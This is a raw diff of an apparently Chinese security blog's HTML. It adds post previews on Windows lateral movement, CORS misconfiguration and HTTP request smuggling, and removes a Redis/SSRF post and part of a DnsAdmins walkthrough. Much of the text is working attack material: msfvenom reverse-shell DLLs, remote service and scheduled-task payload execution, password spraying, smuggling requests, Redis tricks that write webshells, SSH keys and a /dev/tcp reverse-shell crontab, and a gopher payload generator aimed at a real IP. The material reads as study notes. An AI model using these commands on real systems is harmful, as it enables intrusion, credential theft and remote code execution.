-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll开启smb共享：（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）
-sudo impacket-smbserver tw .注入dll
-dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll监听：
-nc -lvvp 444重启dns致使paylload生效：
-sc.exe stop dns
-sc.exe start dns或
-sc.exe \\10.10.10.169 stop dns
-sc.exe \\10.10.10.169 start dns  
-
-
-</section>
-    <p class="sub">Apr 30, 2020</p>
-  </div>
-</div>-->
-<!---->
 <!--
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">&lt;span class&#x3D;&quot;iconfont icon-arrow-right&quot;&gt;&lt;&#x2F;span&gt;</a>
@@ -1267,6 +1394,414 @@ sc.exe \\10.10.10.169 start dns
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="Lateral Movementt" alt="Lateral Movementt" href="/2020/06/02/Lateral-Movementt/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="Lateral Movementt" alt="Lateral Movementt"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; Lateral Movementt &gt;</div>
+                            <div class="content flex1">
+                                
+  PSEXEC优点：微软的东东
+执行原理： 
+
+通过ipc$连接，释放psexesvc.exe到目标机器
+
+通过服务管理SCManager远程创建psexecsvc服务，并启动服务
+
+客户端连接执行命令，服务端启动相应的程序并执行回显数据。
+
+运行完后删除服务
+
+
+使用方式：
+1、先建立IPC通道连接，然后直接使用
+net use \\192.168.0.116\ipc$ “password” /user:administrator
+psexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    2、在psexec的参数中指定账户密码
+psexec.exe \\192.168.0.116 –u administrator –p password  cmd -accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框
+-hashes可支持hash密码
+使用psexec最低要求
+
+远程机器的 139 或 445 端口需要开启状态，即 SMB；
+
+
+明文密码或者 NTLM 哈希；
+
+
+具备将文件写入共享文件夹的权限；
+
+
+能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；
+
+
+能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）
+
+在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec
+WMI执行原理：
+WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹
+利用条件：
+
+WMI服务开启，端口135，默认开启。
+
+防火墙允许135、445等端口通信。
+
+
+wmic（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：
+工作组横向：
+wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;域内横向：
+wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”wmiexec： 
+获取半交互式shell：
+cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password在远程系统上执行单条命令：
+cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;在远程系统上执行bat脚本：
+cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat使用hash的情况：wce注入hash再进行连接
+wce –s 账号:主机名或域的名字:LM:NTLM
+
+cscript //nologo wmiexec.vbs /shell 192.168.0.1注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash
+Invoke-WMIMethod  （powershell自带,执行单条命令）
+$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred其他的利用还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)
+scService Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件
+copy service.exe \\192.168.0.116\admin$\temp
+
+sc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;
+
+sc \\192.168.0.116 start TestService
+
+sc \\192.168.0.116 delete TestServicemsfvenom生成service exe：
+-f exe-serviceCS生成service exe：
+输出项选择windows service exe计划任务win xp/2003 为at命令
+win7+ 为schtasks命令
+利用条件：
+
+目标管理员账户凭据
+
+当前机器可正常net use到远程机器
+
+目标机器的计划任务服务“Task scheduler”已正常启动
+
+
+net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享
+
+net time \\192.168.0.116###查看目标主机当前时间
+
+xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payload
+
+chcp 437  ###如果目标为中文系统，需要先调整字符集
+
+schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务
+
+schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行
+
+schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态
+
+schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务参数讲解：
+/TN：任务名称
+/TR：任务执行的程序
+/ST：任务执行的时间
+winRMWindows Remote Management通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理
+利用条件：
+
+在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。
+
+防火墙对5986、5985端口开放。
+
+
+powershell：
+第一次执行winrm：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。
+Set-Item WSMan:localhost\client\trustedhosts -value *
+Restart-Service WinRM常用命令：
+Enable-PSRemoting -force   ###需要目标机器开启远程管理
+
+Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口
+
+Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任
+
+Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令
+
+Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框用户凭证使用：
+$User=&quot;administrator&quot; 
+$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
+$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
+Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}直接使用mimikatz获取远程机器的账户密码：(在域中测试成功，工作组没能成功)
+Import-Module ./Invoke-Mimikatz.ps1
+Invoke-Mimikatz -ComputerName TARGETwinrs：
+winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令
+winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shellevil-winrm 可通过用户凭证密码/hash直接获得交互shell
+DCOMCOM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。
+DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据
+获取DCOM列表
+Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
+或
+Get-CimInstance Win32_DCOMApplication  #需win12以上存在某些具有命令执行功能的DCOM，可用于横向移动
+MMC20.Application COM：（域中测试成功，工作组只能本地成功而不能远程）查看该DCOM信息：
+Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;与目标建立连接：
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))
+$com.Document.ActiveView | Get-Member通过ExecuteShellCommand执行程序：
+$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)Excel.Application
+自动化脚本
+## Password Spraying ##
+Password Spraying实际上是域用户爆破
+首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值
+自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证
+Import-Module .\DomainPasswordSpray.ps1 
+Invoke-DomainPasswordSpray -Password password其他可选参数：
+UserList-用于Spraying的用户列表。 如果未指定，将自动生成。
+password-用于Spraying的单个密码。
+PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）
+OutFile-输出结果到指定文件
+domain-要对其进行Spraying的域。
+Force-强制喷Spraying继续进行而不提示确认
+RDPsharpRDP：SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456
+CS中实现：
+
+基于tscon的RDP会话劫持https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/
+https://pentestlab.blog/tag/rdp-session-hijacking/
+https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
+PTH&amp;PTT&amp;OverPTH:没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。
+当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权
+需要设置为1，非内置的sid为500的用户才能进行远程连接
+不会影响本地Administrators组中的域帐户，仅影响本地帐户
+cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fhttps://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
+printers, open webroots, good old Tomcat还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境
+链接：
+https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
+https://lengjibo.github.io/LateralMovement/
+https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
+https://ired.team/offensive-security/lateral-movement
+https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/
+https://my.oschina.net/u/4283892/blog/3307767
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="CORS配置不当学习" alt="CORS配置不当学习" href="/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="CORS配置不当学习" alt="CORS配置不当学习"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; CORS配置不当学习 &gt;</div>
+                            <div class="content flex1">
+                                
+  CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。
+SOP（Same-origin policy：##SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象
+同源三要素：
+
+同域名 
+同协议 
+同端口
+
+CORS（Cross-origin Resourse SharingCORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源
+CORS实现：（简单请求/非简单请求）
+请求头：
+1、origin,用于说明本次请求来自哪个源（域名+协议+端口）
+2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法
+3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段响应头：
+1、Access-Control-Allow-Origin(ACAO) 
+用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*
+2、Access-Control-Allow-Credentials
+表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials漏洞挖掘：CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。
+使用burpsuit进行快速验证：
+
+访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:
+
+也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true绕过：
+NULL源
+使用目标域名作为子域名
+…
+
+CORS与JSONP的比较
+CORS与JSONP的使用目的相同，但是比JSONP更强大。
+JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
+更多学习链接：
+CORS三种攻击场景： https://xz.aliyun.com/t/4663
+CORS安全完全指南： https://xz.aliyun.com/t/2745
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="HTTP Request Smuggling" alt="HTTP Request Smuggling" href="/2020/06/02/HTTP-Request-Smuggling/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="HTTP Request Smuggling" alt="HTTP Request Smuggling"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; HTTP Request Smuggling &gt;</div>
+                            <div class="content flex1">
+                                
+  HTTP请求走私（HTTP Request Smuggling）
+原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突
+HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞
+这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击
+
+Content-LengthContent-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）
+POST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+q=smugglingTransfer-EncodingPOST /search HTTP/1.1
+Host: xxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+b---&gt; data长度，十六进制
+q=smuggling---&gt;data
+0---&gt;结束符，后接\r\n\r\nKeep Alive##在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。
+相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接
+危害能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户
+漏洞类型
+CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
+TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
+TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   
+
+Transfer-Encoding: xchunked
+
+
+Transfer-Encoding : chunked
+
+
+Transfer-Encoding: chunked
+
+Transfer-Encoding: x
+
+
+
+Transfer-Encoding:[tab]chunked
+
+
+
+[space]Transfer-Encoding: chunked
+
+
+
+X: X[\n]Transfer-Encoding: chunked
+
+
+
+Transfer-Encoding
+
+: chunked漏洞检测&amp;验证&amp;利用
+需要关闭自动更新Content-Length功能：
+
+漏洞检测：
+POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+Q上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。
+检测TE.CL
+POST / HTTP/1.1
+Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G0终止符后，后端将超时，等待X到达
+两种数据包比较：
+
+漏洞验证
+
+漏洞利用：(发包需要多试几次)
+CL.TE:
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GTE.CL:
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0终止符0后边接 \r\n\r\n
+TE.TE：
+POST / HTTP/1.1
+Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: xxx
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+x=1
+0多种利用案例靶场：https://portswigger.net/web-security/request-smuggling/exploiting  
+案例视频讲解： https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10
+https://xz.aliyun.com/t/6878 —&gt;内含很多利用案例
+https://www.youtube.com/watch?v=kgkRih2MQtU
+https://portswigger.net/web-security/request-smuggling
+https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 内含很多利用案例
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Jun 2, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="邮件伪造" alt="邮件伪造" href="/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"
                        class="post-item swiper-slide flex flex-v">
@@ -2272,287 +2807,6 @@ https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-exa
                                 <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                 <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                 <span><i class="iconfont icon-shijian"></i>May 19, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="SSRF+Redis" alt="SSRF+Redis" href="/2020/05/19/SSRF-Redis/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="SSRF+Redis" alt="SSRF+Redis"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; SSRF+Redis &gt;</div>
-                            <div class="content flex1">
-                                
-  猪猪侠SSRF议题
-形成SSRF的代码示例：
-&lt;?php
-function curl($url){  
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_exec($ch);
-curl_close($ch);
-}
-$url = $_GET[&apos;url&apos;];
-curl($url);
-?&gt;SSRF绕过限制：
-利用短网址
-
-xip.io  –&gt; 127.0.0.1.xip.io
-
-@符号绕过 –&gt; www.baidu.com@127.0.0.1 —&gt;访问127.0.0.1（利用解析问题绕过）
-
-dns rebinding ： http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/
-
-更改ip地址写法，如十六进制 http://127.0.0.1 —&gt;http://0177.0.0.1
-
-协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）
- 
-
-
-
-Redis未授权绝对路径写webshell：
-flushall
-set 1 ‘‘ 
-config set dir /var/www/html
-config set dbfilename shell.php
-save
-
-写ssh公钥：
-ssh-keygen -t rsa ###生成公钥
-flushall
-set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=
-config set dir /root/.ssh/
-config set dbfilename authorized_keys
-save
-
-写contrab定时任务反弹shell：
-
-flushall
-set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’
-config set dir /var/spool/cron/
-config set dbfilename root
-save
-
-SSRF+Redis利用
-http、https 内网服务探测
-file-读取文本
-file:///etc/passwd
-….
-dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）
-
-dict://127.0.0.1:6379/infodict://127.0.0.1:6379/getuserdict://127.0.0.1:6379/flushall
-gopher 万能协议反弹shell：(redis利用需要REST编码)
-Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码转换Redis RESP格式脚本https://xz.aliyun.com/t/5665#toc-4根据需求更改payload、filename、path的值
-import urllib
-protocol=&quot;gopher://&quot;
-ip=&quot;127.0.0.1&quot;
-port=&quot;6379&quot;
-payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
-filename=&quot;shell.php&quot;
-path=&quot;/var/www/html&quot;
-passwd=&quot;&quot;
-cmd=[&quot;flushall&quot;,
- &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
- &quot;config set dir {}&quot;.format(path),
- &quot;config set dbfilename {}&quot;.format(filename),
- &quot;save&quot;
- ]
-if passwd:
-cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
-payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
-def redis_format(arr):
-CRLF=&quot;\r\n&quot;
-redis_arr = arr.split(&quot; &quot;)
-cmd=&quot;&quot;
-cmd+=&quot;*&quot;+str(len(redis_arr))
-for x in redis_arr:
-cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
-cmd+=CRLF
-return cmd
-if __name__==&quot;__main__&quot;:
-for x in cmd:
-payload += urllib.quote(redis_format(x))
-print payloadubuntu无法写crontab反弹shell： https://xz.aliyun.com/t/1800
-
-SSRF利用redis之不换行
-FLUSHALL
-config set dir /var/www/html/
-set a1 ZY%16%0E%16F
-set a2 ffffff
-BITOP XOR payload a1 a2
-append payload eval($_GET[c]);%3f&gt;
-config set dbfilename cmd.php
-save
-
-Gopher有如下几点问题
-
-PHP的curl默认不跟随302跳转
-curl7.43gopher协议存在%00截断的BUG，v7.45以上可用
-file_get_contents()的SSRF，gopher协议不能使用URLencode
-file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败
-
-SSRF 打内网之POST请求(CTF题目)http://152.136.63.75:8016/index.php?url=    —&gt;存在SSRF
-目录扫描发现 http://152.136.63.75:8016/webshe11231231231.php 页面
-view-source:http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php   —&gt;file读取webshell源码
-&lt;?php
-
-$serverList = array(
-&quot;127.0.0.1&quot;
-);
-$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
-foreach ($serverList as $host) {
-if ($ip === $host) {
-if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
-@eval($_POST[&apos;hacker&apos;]);
-} else {
-die(&quot;You aren&apos;t admin!&quot;);
-}
-} else {
-die(&apos;This is webshell&apos;);
-}
-}GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：
-exp = &apos;&apos;&apos;\
-POST /webshe11231231231.php HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: deflate
-DNT: 1
-Connection: close
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 56
-admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
-&apos;&apos;&apos;
-import urllib
-tmp = urllib.quote(exp)
-new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
-result = &quot;_&quot;+urllib.quote(new)
-print result更改命令的时候Content-Length的值也需要修改根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”
-
-如上图所示，所以需要两次编码
-生成paylaod：
-kali@kali:~$ python exp.py
-_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A最后exp：
-152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
